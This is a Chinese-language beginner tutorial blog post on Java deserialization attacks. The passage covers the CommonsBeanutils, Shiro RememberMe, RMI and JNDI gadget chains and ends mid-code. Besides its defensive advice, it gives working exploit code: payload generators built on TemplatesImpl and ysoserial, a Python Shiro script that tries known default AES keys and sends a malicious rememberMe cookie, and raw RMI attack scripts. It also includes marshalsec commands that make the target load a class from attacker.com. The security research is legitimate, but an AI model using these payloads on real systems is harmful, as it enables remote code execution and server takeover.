---
layout: post
title: "Java反序列化漏洞完全指南：从原理到11大利用链详解（新手向）"
date: 2026-06-16 10:00:00 +0800
categories: [网络安全, Java安全]
tags: [Java反序列化, CommonsBeanutils, Shiro, RMI, JNDI, Fastjson, Jackson, Rome, 二次反序列化, JDBC, Hessian, SnakeYAML, 漏洞分析, 安全防御, 渗透测试]
author: Security Researcher
description: 面向新手的Java反序列化漏洞完全指南。从序列化基础原理讲起，详解CommonsBeanutils、Shiro、RMI、JNDI、Fastjson、Jackson、Rome、二次反序列化、JDBC、Hessian、SnakeYAML等11大利用链。包含原理图解、代码示例、Payload构造和防御建议。
---

> **免责声明**：本文仅供学习交流使用，请勿用于非法用途。进行安全测试时，请确保已获得目标系统的合法授权。未经授权对他人系统进行渗透测试属于违法行为。

## 目录
- [Java序列化基础](#java序列化基础)
- [反序列化漏洞原理](#反序列化漏洞原理)
- [1. CommonsBeanutils (cb) 链](#1-commonsbeanutils-cb-链)
- [2. Shiro 反序列化（RememberMe Cookie）](#2-shiro-反序列化rememberme-cookie)
- [3. RMI 反序列化](#3-rmi-反序列化)
- [4. JNDI 注入](#4-jndi-注入)
- [5. Fastjson 反序列化](#5-fastjson-反序列化)
- [6. Jackson 反序列化](#6-jackson-反序列化)
- [7. Rome 反序列化](#7-rome-反序列化)
- [8. 二次反序列化](#8-二次反序列化)
- [9. JDBC 反序列化](#9-jdbc-反序列化)
- [10. Hessian 反序列化](#10-hessian-反序列化)
- [11. SnakeYAML 反序列化](#11-snakeyaml-反序列化)
- [通用防御措施](#通用防御措施)
- [总结](#总结)
- [参考资源](#参考资源)

---

## Java序列化基础

### 什么是序列化和反序列化？

| 概念 | 定义 | 类比 |
|------|------|------|
| **序列化** | 将对象转换为字节流，便于存储或传输 | 把食物做成罐头 |
| **反序列化** | 将字节流还原为对象 | 把罐头还原成食物 |

### 为什么需要序列化？

- **网络传输**：RMI、JMS等远程调用需要传输对象
- **持久化存储**：将对象保存到文件或数据库
- **缓存**：将对象序列化后存入Redis等缓存
- **分布式系统**：微服务之间传递对象数据

### 代码示例

```java
import java.io.*;

// 对象必须实现Serializable接口
class User implements Serializable {
    private static final long serialVersionUID = 1L;
    private String name;
    private int age;

    public User(String name, int age) {
        this.name = name;
        this.age = age;
    }

    @Override
    public String toString() {
        return "User{name='" + name + "', age=" + age + "}";
    }
}

public class SerializeDemo {
    public static void main(String[] args) throws Exception {
        // ===== 序列化 =====
        User user = new User("admin", 25);
        ObjectOutputStream oos = new ObjectOutputStream(
            new FileOutputStream("user.dat"));
        oos.writeObject(user);
        oos.close();

        // ===== 反序列化 =====
        ObjectInputStream ois = new ObjectInputStream(
            new FileInputStream("user.dat"));
        User restored = (User) ois.readObject();
        ois.close();

        System.out.println(restored);  // User{name='admin', age=25}
    }
}
```

### 序列化后的数据格式

```
- 魔数：AC ED（固定标识这是Java序列化数据）
- 版本号：00 05
- 类描述：包含类名、serialVersionUID等
- 对象数据：各个字段的值
```

### 关键类

| 类名 | 作用 |
|------|------|
| `ObjectOutputStream` | 将对象序列化为字节流 |
| `ObjectInputStream` | 将字节流反序列化为对象 |
| `Serializable` | 标记接口，表示类可以被序列化 |
| `Externalizable` | 扩展接口，自定义序列化逻辑 |

---

## 反序列化漏洞原理

### 漏洞产生的根本原因

反序列化漏洞的核心问题：**Java在反序列化时会自动调用对象的 `readObject()` 方法，而攻击者可以控制输入数据。**

正常流程：
```
应用程序收到数据 → 调用readObject() → 对象被还原 → 程序继续执行
```

攻击流程：
```
攻击者构造恶意数据 → 应用程序调用readObject() → 触发恶意代码 → 执行命令
```

### 魔术方法（Magic Methods）

Java反序列化时会自动调用以下方法：

| 方法名 | 触发时机 |
|--------|----------|
| `readObject()` | 反序列化时调用 |
| `readResolve()` | 反序列化后调用，可替换返回对象 |
| `readExternal()` | 实现Externalizable接口时调用 |

### 攻击链（Gadget Chain）

单个类的 `readObject()` 往往不够用，攻击者需要**串联多个类**，形成一条调用链：

```
readObject() → 方法A → 方法B → 方法C → 执行命令
```

每个环节都是JDK或第三方库中**已存在的类**，攻击者只需要精心构造序列化数据，就能触发整条链。

---

## 1. CommonsBeanutils (cb) 链

### 1.1 原理讲解

CommonsBeanutils是Apache提供的一个JavaBean操作工具库，提供了对JavaBean属性进行get/set操作的便捷方法。CB链利用的是 `PropertyUtils.getProperty()` 方法在执行时会调用对象的getter方法这一特性。

#### 核心原理

```
┌─────────────────────────────────────────────────────────────┐
│                    CommonsBeanutils链调用流程                 │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  PriorityQueue.readObject()                                 │
│       ↓                                                     │
│  PriorityQueue.heapify()                                    │
│       ↓                                                     │
│  PriorityQueue.siftDown()                                   │
│       ↓                                                     │
│  PriorityQueue.siftDownUsingComparator()                    │
│       ↓                                                     │
│  BeanComparator.compare()                                   │
│       ↓                                                     │
│  PropertyUtils.getProperty()                                │
│       ↓                                                     │
│  TemplatesImpl.getOutputProperties()                        │
│       ↓                                                     │
│  加载恶意字节码 → 执行任意代码                                │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### 关键类分析

**BeanComparator**：
```java
public class BeanComparator implements Comparator, Serializable {
    private String property;
    private Comparator comparator;

    public int compare(Object o1, Object o2) {
        if (this.property != null) {
            // 关键：调用PropertyUtils.getProperty()
            Object value1 = PropertyUtils.getProperty(o1, this.property);
            Object value2 = PropertyUtils.getProperty(o2, this.property);
            return this.comparator.compare(value1, value2);
        }
        return this.comparator.compare(o1, o2);
    }
}
```

**PropertyUtils.getProperty()**：
```java
// 会调用对象的getter方法
// 当property为"outputProperties"时，会调用TemplatesImpl.getOutputProperties()
```

**TemplatesImpl.getOutputProperties()**：
```java
public synchronized Properties getOutputProperties() {
    try {
        return newTransformer().getOutputProperties();
    } catch (TransformerConfigurationException e) {
        return null;
    }
}
```

调用 `newTransformer()` 会触发恶意字节码加载。

### 1.2 漏洞代码示例

```java
import java.io.*;
import java.util.PriorityQueue;
import org.apache.commons.beanutils.BeanComparator;

public class VulnerableApp {
    public static void main(String[] args) throws Exception {
        // 从文件读取序列化数据（假设来自用户输入）
        FileInputStream fis = new FileInputStream("payload.bin");
        ObjectInputStream ois = new ObjectInputStream(fis);
        
        // 危险操作：直接反序列化用户输入
        Object obj = ois.readObject();
        System.out.println("Deserialized: " + obj);
        
        ois.close();
    }
}
```

### 1.3 Payload构造

#### 步骤1：准备恶意类字节码

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class EvilClass extends AbstractTranslet {
    public EvilClass() {
        super();
        try {
            // 执行系统命令
            Runtime.getRuntime().exec("calc");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
}
```

#### 步骤2：构造Payload

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.beanutils.BeanComparator;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CB1Payload {
    public static void main(String[] args) throws Exception {
        // 1. 读取恶意类字节码
        byte[] evilCode = readClassBytes("EvilClass.class");
        
        // 2. 构造TemplatesImpl
        TemplatesImpl templates = new TemplatesImpl();
        setField(templates, "_bytecodes", new byte[][]{evilCode});
        setField(templates, "_name", "evil");
        setField(templates, "_tfactory", new com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl());
        
        // 3. 创建BeanComparator，指定property为outputProperties
        BeanComparator comparator = new BeanComparator("outputProperties");
        
        // 4. 创建PriorityQueue
        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(templates);
        queue.add(templates);
        
        // 5. 序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(queue);
        oos.close();
        
        // 6. 保存Payload
        byte[] payload = baos.toByteArray();
        FileOutputStream fos = new FileOutputStream("cb1_payload.bin");
        fos.write(payload);
        fos.close();
        
        System.out.println("Payload generated: " + payload.length + " bytes");
    }
    
    private static void setField(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    
    private static byte[] readClassBytes(String filename) throws Exception {
        FileInputStream fis = new FileInputStream(filename);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int len;
        while ((len = fis.read(buffer)) != -1) {
            baos.write(buffer, 0, len);
        }
        fis.close();
        return baos.toByteArray();
    }
}
```

#### 使用ysoserial生成

```bash
# 生成CB1链Payload
java -jar ysoserial.jar CommonsBeanutils1 "calc" > cb1_payload.bin

# 生成CB2链Payload（使用不同入口）
java -jar ysoserial.jar CommonsBeanutils2 "calc" > cb2_payload.bin
```

### 1.4 利用代码示例

```java
import java.io.*;
import java.net.*;

public class CB1Exploit {
    public static void main(String[] args) throws Exception {
        // 读取Payload
        byte[] payload = readPayload("cb1_payload.bin");
        
        // 发送Payload到目标
        String target = "http://vulnerable-app.com/api/deserialize";
        URL url = new URL(target);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setRequestProperty("Content-Type", "application/octet-stream");
        
        OutputStream os = conn.getOutputStream();
        os.write(payload);
        os.flush();
        os.close();
        
        int responseCode = conn.getResponseCode();
        System.out.println("Response Code: " + responseCode);
    }
    
    private static byte[] readPayload(String filename) throws Exception {
        FileInputStream fis = new FileInputStream(filename);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int len;
        while ((len = fis.read(buffer)) != -1) {
            baos.write(buffer, 0, len);
        }
        fis.close();
        return baos.toByteArray();
    }
}
```

### 1.5 防御措施

```java
// 1. 使用白名单限制反序列化类
ObjectInputStream ois = new ObjectInputStream(inputStream) {
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        String className = desc.getName();
        // 只允许特定类
        if (!className.equals("com.safe.MyClass")) {
            throw new InvalidClassException("Unauthorized deserialization", className);
        }
        return super.resolveClass(desc);
    }
};

// 2. 升级CommonsBeanutils到安全版本
// CommonsBeanutils 1.9.4+ 修复了此漏洞

// 3. 使用ObjectInputFilter（Java 9+）
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("!com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
ois.setObjectInputFilter(filter);

// 4. 使用JSON替代Java原生序列化
String json = "{\"name\":\"admin\",\"age\":25}";
User user = new Gson().fromJson(json, User.class);
```

---

## 2. Shiro 反序列化（RememberMe Cookie）

### 2.1 原理讲解

Apache Shiro是一个强大且易用的Java安全框架，提供了认证、授权、加密和会话管理等功能。Shiro的RememberMe功能存在反序列化漏洞（CVE-2016-4437）。

#### 漏洞原理

```
┌─────────────────────────────────────────────────────────────┐
│                    Shiro RememberMe漏洞流程                   │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. 用户登录时勾选"Remember Me"                              │
│       ↓                                                     │
│  2. Shiro生成RememberMe Cookie                              │
│       ↓                                                     │
│  3. Cookie格式：base64(AES加密(序列化数据))                   │
│       ↓                                                     │
│  4. 攻击者构造恶意序列化数据                                  │
│       ↓                                                     │
│  5. 使用已知密钥AES加密 → base64编码                          │
│       ↓                                                     │
│  6. 发送Cookie到服务器                                       │
│       ↓                                                     │
│  7. Shiro解密并反序列化 → 触发RCE                            │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### 关键点

1. **AES加密**：Shiro使用AES-CBC模式加密序列化数据
2. **默认密钥**：Shiro 1.2.4及之前版本使用固定的默认密钥
3. **Cookie格式**：`rememberMe=base64(AES加密(序列化数据))`

### 2.2 漏洞代码示例

Shiro的配置文件 `shiro.ini`：
```ini
[main]
# 默认密钥（危险！）
securityManager.rememberMeManager.cipherKey = kPH+bIxk5D2deZiIxcaaaA==

[urls]
/** = user
```

漏洞存在于 `AbstractRememberMeManager` 类：
```java
public abstract class AbstractRememberMeManager implements RememberMeManager {
    // 默认密钥
    private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
    
    protected byte[] convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) {
        // 解密
        byte[] decrypted = decrypt(bytes);
        // 反序列化（危险！）
        return deserialize(decrypted);
    }
    
    protected byte[] decrypt(byte[] encrypted) {
        byte[] serialized = crypt(encrypted, getDecryptionCipherKey());
        return serialized;
    }
}
```

### 2.3 Payload构造

#### 步骤1：获取已知密钥列表

Shiro存在多个已知密钥：
```
kPH+bIxk5D2deZiIxcaaaA==
4AvVhmFLUs0KTA3Kprsdag==
v3USKjrKw/MYS4+u5H9k4A==
Z3usXhLsWrJS6W1q2qE0Ig==
...（共20+个已知密钥）
```

#### 步骤2：构造恶意Cookie

```python
import base64
import uuid
import subprocess
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

# 已知密钥
key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")

# 使用ysoserial生成Payload
def generate_payload(gadget, command):
    cmd = f"java -jar ysoserial.jar {gadget} '{command}'"
    result = subprocess.run(cmd, shell=True, capture_output=True)
    return result.stdout

# AES-CBC加密
def encrypt_aes(data, key):
    iv = uuid.uuid4().bytes
    cipher = AES.new(key, AES.MODE_CBC, iv)
    # PKCS5Padding
    padding_len = 16 - (len(data) % 16)
    padded_data = data + bytes([padding_len] * padding_len)
    encrypted = cipher.encrypt(padded_data)
    return base64.b64encode(iv + encrypted)

# 生成恶意Cookie
def generate_rememberme_cookie(gadget, command, key):
    payload = generate_payload(gadget, command)
    cookie = encrypt_aes(payload, key)
    return cookie.decode()

# 示例：生成Cookie
cookie = generate_rememberme_cookie("CommonsCollections2", "calc", key)
print(f"rememberMe={cookie}")
```

#### 完整利用脚本

```python
#!/usr/bin/env python3
import base64
import requests
import subprocess
import sys
from Crypto.Cipher import AES

# 已知密钥列表
KEYS = [
    "kPH+bIxk5D2deZiIxcaaaA==",
    "4AvVhmFLUs0KTA3Kprsdag==",
    "v3USKjrKw/MYS4+u5H9k4A==",
    "Z3usXhLsWrJS6W1q2qE0Ig==",
    "f/SY5TIve5WWmuTzs4b8ng==",
]

def generate_payload(gadget, command):
    """使用ysoserial生成Payload"""
    cmd = ["java", "-jar", "ysoserial.jar", gadget, command]
    result = subprocess.run(cmd, capture_output=True)
    return result.stdout

def encrypt_aes_cbc(data, key):
    """AES-CBC加密"""
    import os
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    
    # PKCS7Padding
    padding_len = 16 - (len(data) % 16)
    padded = data + bytes([padding_len] * padding_len)
    
    encrypted = cipher.encrypt(padded)
    return base64.b64encode(iv + encrypted).decode()

def exploit(target, gadget, command):
    """执行攻击"""
    payload = generate_payload(gadget, command)
    
    for key_b64 in KEYS:
        key = base64.b64decode(key_b64)
        cookie = encrypt_aes_cbc(payload, key)
        
        headers = {
            "Cookie": f"rememberMe={cookie}"
        }
        
        try:
            resp = requests.get(target, headers=headers, timeout=10)
            # 检查响应中是否包含rememberMe=deleteMe
            if "rememberMe=deleteMe" not in resp.headers.get("Set-Cookie", ""):
                print(f"[+] 可能成功！密钥: {key_b64}")
                return True
        except Exception as e:
            print(f"[-] 请求失败: {e}")
    
    print("[-] 所有密钥尝试失败")
    return False

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <target> <gadget> <command>")
        print(f"Example: {sys.argv[0]} http://target.com CommonsCollections2 'calc'")
        sys.exit(1)
    
    target = sys.argv[1]
    gadget = sys.argv[2]
    command = sys.argv[3]
    
    exploit(target, gadget, command)
```

### 2.4 利用代码示例

```java
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.net.*;
import java.util.Base64;

public class ShiroExploit {
    // 已知默认密钥
    private static final String DEFAULT_KEY = "kPH+bIxk5D2deZiIxcaaaA==";
    
    public static void main(String[] args) throws Exception {
        // 读取Payload
        byte[] payload = readFile("payload.bin");
        
        // 加密Payload
        String cookie = encryptRememberMe(payload, DEFAULT_KEY);
        
        // 发送请求
        String target = "http://vulnerable-shiro.com/login";
        sendExploit(target, cookie);
    }
    
    private static String encryptRememberMe(byte[] payload, String keyBase64) throws Exception {
        byte[] key = Base64.getDecoder().decode(keyBase64);
        
        // 生成随机IV
        byte[] iv = new byte[16];
        new java.security.SecureRandom().nextBytes(iv);
        
        // AES-CBC加密
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
        IvParameterSpec ivSpec = new IvParameterSpec(iv);
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);
        
        byte[] encrypted = cipher.doFinal(payload);
        
        // IV + 密文，然后base64编码
        byte[] result = new byte[iv.length + encrypted.length];
        System.arraycopy(iv, 0, result, 0, iv.length);
        System.arraycopy(encrypted, 0, result, iv.length, encrypted.length);
        
        return Base64.getEncoder().encodeToString(result);
    }
    
    private static void sendExploit(String target, String cookie) throws Exception {
        URL url = new URL(target);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setRequestProperty("Cookie", "rememberMe=" + cookie);
        
        int code = conn.getResponseCode();
        System.out.println("Response: " + code);
    }
    
    private static byte[] readFile(String filename) throws Exception {
        FileInputStream fis = new FileInputStream(filename);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int len;
        while ((len = fis.read(buffer)) != -1) {
            baos.write(buffer, 0, len);
        }
        fis.close();
        return baos.toByteArray();
    }
}
```

### 2.5 防御措施

```java
// 1. 升级Shiro到安全版本
// Shiro 1.2.5+ 不再使用默认密钥

// 2. 使用随机生成的密钥
// shiro.ini
[main]
# 生成随机密钥
securityManager.rememberMeManager.cipherKey = ${randomBase64:32}

// 3. 禁用RememberMe功能
// shiro.ini
[main]
securityManager.rememberMeManager = null

// 4. 自定义RememberMeManager，添加签名验证
public class SecureRememberMeManager extends CookieRememberMeManager {
    private static final String HMAC_ALGORITHM = "HmacSHA256";
    private byte[] hmacKey;
    
    @Override
    protected byte[] convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) {
        // 验证HMAC签名
        if (!verifyHmac(bytes)) {
            throw new AuthenticationException("Invalid remember me cookie signature");
        }
        return super.convertBytesToPrincipals(bytes, subjectContext);
    }
    
    private boolean verifyHmac(byte[] data) {
        // HMAC验证逻辑
        return true;
    }
}

// 5. 使用WAF检测rememberMe Cookie
// 规则：检测异常的Cookie长度或特征
```

---

## 3. RMI 反序列化

### 3.1 原理讲解

RMI（Remote Method Invocation）是Java的远程方法调用机制，允许一个Java虚拟机上的对象调用另一个Java虚拟机上的对象的方法。RMI在传输对象时会使用Java原生序列化，这就带来了反序列化漏洞的风险。

#### RMI架构

```
┌─────────────────────────────────────────────────────────────┐
│                        RMI架构图                             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   客户端 (Client)              服务端 (Server)               │
│   ┌──────────────┐             ┌──────────────┐             │
│   │ Stub (代理)   │◄───────────►│ Skeleton     │             │
│   │              │   网络通信   │ (骨架)       │             │
│   └──────────────┘             └──────────────┘             │
│          │                            │                     │
│          ▼                            ▼                     │
│   ┌──────────────┐             ┌──────────────┐             │
│   │ 调用远程方法  │             │ 执行实际方法  │             │
│   └──────────────┘             └──────────────┘             │
│                                                             │
│   通信过程：序列化参数 → 传输 → 反序列化参数 → 执行          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### 漏洞触发点

```
┌─────────────────────────────────────────────────────────────┐
│                    RMI反序列化漏洞流程                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. 攻击者启动恶意RMI Registry                              │
│       ↓                                                     │
│  2. 客户端连接Registry，获取远程对象引用                     │
│       ↓                                                     │
│  3. Registry返回序列化的远程对象（包含恶意数据）              │
│       ↓                                                     │
│  4. 客户端反序列化对象 → 触发漏洞                            │
│                                                             │
│  或者：                                                     │
│                                                             │
│  1. 攻击者向RMI服务端发送恶意序列化参数                      │
│       ↓                                                     │
│  2. 服务端反序列化参数 → 触发漏洞                            │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 3.2 漏洞代码示例

```java
import java.rmi.*;
import java.rmi.registry.*;
import java.rmi.server.*;

// 远程接口
public interface IRemoteService extends Remote {
    Object process(Object data) throws RemoteException;
}

// 服务端实现
public class RemoteServiceImpl extends UnicastRemoteObject implements IRemoteService {
    public RemoteServiceImpl() throws RemoteException {
        super();
    }
    
    @Override
    public Object process(Object data) throws RemoteException {
        // 危险：直接返回用户传入的对象
        return data;
    }
    
    public static void main(String[] args) throws Exception {
        // 创建Registry
        Registry registry = LocateRegistry.createRegistry(1099);
        // 绑定远程对象
        IRemoteService service = new RemoteServiceImpl();
        registry.bind("RemoteService", service);
        System.out.println("RMI Server started...");
    }
}
```

### 3.3 Payload构造

#### 攻击RMI Registry

```java
import java.rmi.*;
import java.rmi.registry.*;
import java.io.*;

public class RMIRegistryAttack {
    public static void main(String[] args) throws Exception {
        // 生成Payload
        byte[] payload = generatePayload("CommonsCollections6", "calc");
        
        // 连接到目标RMI Registry
        String target = "localhost";
        int port = 1099;
        Registry registry = LocateRegistry.getRegistry(target, port);
        
        // 构造恶意对象
        // 利用RMI的bind/rebind操作发送恶意对象
        // 注意：需要配合JRMPListener使用
        
        System.out.println("Attack payload prepared");
    }
    
    private static byte[] generatePayload(String gadget, String command) throws Exception {
        ProcessBuilder pb = new ProcessBuilder(
            "java", "-jar", "ysoserial.jar", gadget, command
        );
        Process process = pb.start();
        
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int len;
        while ((len = process.getInputStream().read(buffer)) != -1) {
            baos.write(buffer, 0, len);
        }
        process.waitFor();
        return baos.toByteArray();
    }
}
```

#### 使用ysoserial的JRMPListener

```bash
# 1. 启动JRMP监听器（作为RMI服务端）
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 "calc"

# 2. 让目标连接我们的JRMP监听器
# 通过JNDI注入或其他方式让目标访问：rmi://attacker-ip:1099/EvilObject
```

#### 完整RMI攻击脚本

```java
import sun.rmi.transport.StreamRemoteCall;
import java.io.*;
import java.net.*;
import java.rmi.registry.*;
import java.rmi.server.*;

public class RMIAttack {
    public static void main(String[] args) throws Exception {
        String targetHost = args[0];
        int targetPort = Integer.parseInt(args[1]);
        String payloadFile = args[2];
        
        // 读取Payload
        byte[] payload = readFile(payloadFile);
        
        // 构造RMI请求
        Socket socket = new Socket(targetHost, targetPort);
        DataOutputStream out = new DataOutputStream(socket.getOutputStream());
        DataInputStream in = new DataInputStream(socket.getInputStream());
        
        // 发送RMI协议头
        out.writeInt(0x4a524d49); // "JRMI"
        out.writeShort(2); // Version
        out.writeByte(0x4b); // Protocol stream
        
        // 发送恶意序列化数据
        out.writeInt(payload.length);
        out.write(payload);
        out.flush();
        
        System.out.println("Payload sent!");
        socket.close();
    }
    
    private static byte[] readFile(String filename) throws Exception {
        FileInputStream fis = new FileInputStream(filename);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int len;
        while ((len = fis.read(buffer)) != -1) {
            baos.write(buffer, 0, len);
        }
        fis.close();
        return baos.toByteArray();
    }
}
```

### 3.4 利用代码示例

```python
#!/usr/bin/env python3
import socket
import struct
import subprocess
import sys

def generate_payload(gadget, command):
    """使用ysoserial生成Payload"""
    cmd = ["java", "-jar", "ysoserial.jar", gadget, command]
    result = subprocess.run(cmd, capture_output=True)
    return result.stdout

def exploit_rmi_registry(host, port, payload):
    """攻击RMI Registry"""
    # RMI协议头
    header = b'\x4a\x52\x4d\x49'  # JRMI
    version = struct.pack('>H', 2)
    protocol = b'\x4b'  # StreamProtocol
    
    # 构造请求
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    
    # 发送协议头
    sock.send(header)
    sock.send(version)
    sock.send(protocol)
    
    # 读取服务端返回
    response = sock.recv(1024)
    print(f"Server response: {response.hex()}")
    
    # 发送恶意序列化数据
    # 这里需要构造完整的RMI调用数据包
    sock.send(struct.pack('>I', len(payload)))
    sock.send(payload)
    
    sock.close()
    print("Payload sent!")

def main():
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <host> <port> <command>")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    command = sys.argv[3]
    
    # 生成Payload
    payload = generate_payload("CommonsCollections6", command)
    print(f"Payload size: {len(payload)} bytes")
    
    # 发送攻击
    exploit_rmi_registry(host, port, payload)

if __name__ == "__main__":
    main()
```

### 3.5 防御措施

```java
// 1. 使用RMI over SSL/TLS
// 创建安全的RMI Registry
Registry registry = LocateRegistry.createRegistry(1099, 
    new SslRMIClientSocketFactory(), 
    new SslRMIServerSocketFactory()
);

// 2. 自定义ObjectInputStream，限制反序列化类
public class SafeObjectInputStream extends ObjectInputStream {
    private static final Set<String> ALLOWED_CLASSES = new HashSet<>(Arrays.asList(
        "java.lang.String",
        "java.util.ArrayList",
        "com.safe.MyClass"
    ));
    
    public SafeObjectInputStream(InputStream in) throws IOException {
        super(in);
    }
    
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        String className = desc.getName();
        if (!ALLOWED_CLASSES.contains(className)) {
            throw new InvalidClassException("Unauthorized deserialization", className);
        }
        return super.resolveClass(desc);
    }
}

// 3. 使用JEP 290的ObjectInputFilter（Java 9+）
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "maxdepth=5;java.base/*;!*"
);

// 4. 禁用Java原生序列化，使用JSON或Protobuf
// 客户端
String json = gson.toJson(request);
// 服务端
Request req = gson.fromJson(json, Request.class);

// 5. 网络隔离
// 限制RMI端口的访问，只允许特定IP连接
```

---

## 4. JNDI 注入

### 4.1 原理讲解

JNDI（Java Naming and Directory Interface）是Java的命名和目录服务接口，提供了统一的接口来访问各种命名和目录服务（如LDAP、RMI、DNS等）。JNDI注入漏洞允许攻击者通过控制JNDI lookup的URL参数，加载远程恶意类。

#### JNDI架构

```
┌─────────────────────────────────────────────────────────────┐
│                        JNDI架构图                            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   Java应用                                                  │
│   ┌─────────────────────────────────────┐                   │
│   │  JNDI API (Context.lookup())        │                   │
│   └─────────────────────────────────────┘                   │
│                    │                                        │
│         ┌─────────┼─────────┐                              │
│         ▼         ▼         ▼                              │
│   ┌─────────┐ ┌─────────┐ ┌─────────┐                     │
│   │ RMI     │ │ LDAP    │ │ DNS     │                     │
│   │ Service │ │ Service │ │ Service │                     │
│   └────┬────┘ └────┬────┘ └────┬────┘                     │
│        │           │           │                           │
│        ▼           ▼           ▼                           │
│   远程对象引用   目录条目查询   域名解析                      │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### 漏洞原理

```
┌─────────────────────────────────────────────────────────────┐
│                    JNDI注入漏洞流程                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. 攻击者控制JNDI lookup的URL参数                          │
│       ↓                                                     │
│  2. URL指向攻击者控制的LDAP/RMI服务器                        │
│       ↓                                                     │
│  3. 服务端向攻击者服务器请求对象                             │
│       ↓                                                     │
│  4. 攻击者返回恶意对象的引用或序列化数据                      │
│       ↓                                                     │
│  5. 服务端加载/反序列化恶意对象 → RCE                        │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### 关键类：JdbcRowSetImpl

```java
public class JdbcRowSetImpl extends BaseRowSet implements JdbcRowSet, Joinable {
    private String dataSourceName;
    
    public void setAutoCommit(boolean autoCommit) throws SQLException {
        if (conn != null) {
            conn.setAutoCommit(autoCommit);
        } else {
            // 关键：调用connect()
            conn = connect();
            conn.setAutoCommit(autoCommit);
        }
    }
    
    private Connection connect() throws SQLException {
        if (conn != null) {
            return conn;
        }
        if (dataSourceName != null) {
            // 危险：进行JNDI lookup
            InitialContext ic = new InitialContext();
            DataSource ds = (DataSource) ic.lookup(dataSourceName);
            return ds.getConnection();
        }
        // ...
    }
}
```

### 4.2 漏洞代码示例

```java
import javax.naming.*;

public class VulnerableJNDI {
    public static void main(String[] args) throws Exception {
        // 危险：直接使用用户输入进行JNDI lookup
        String jndiUrl = request.getParameter("jndiUrl");
        
        Context ctx = new InitialContext();
        // 危险！用户可控的URL
        Object obj = ctx.lookup(jndiUrl);
        
        System.out.println("Lookup result: " + obj);
    }
}
```

### 4.3 Payload构造

#### LDAP攻击方式

```bash
# 1. 启动LDAP服务器（使用marshalsec）
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer \
    "http://attacker.com:8080/#EvilClass" 1389

# 2. 启动HTTP服务器提供恶意类
python3 -m http.server 8080

# 3. 恶意类 EvilClass.java
```

```java
public class EvilClass {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

#### RMI攻击方式

```bash
# 1. 启动RMI服务器
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer \
    "http://attacker.com:8080/#EvilClass" 1099
```

#### 利用JdbcRowSetImpl的Payload

```java
import com.sun.rowset.JdbcRowSetImpl;
import java.io.*;

public class JNDIPayload {
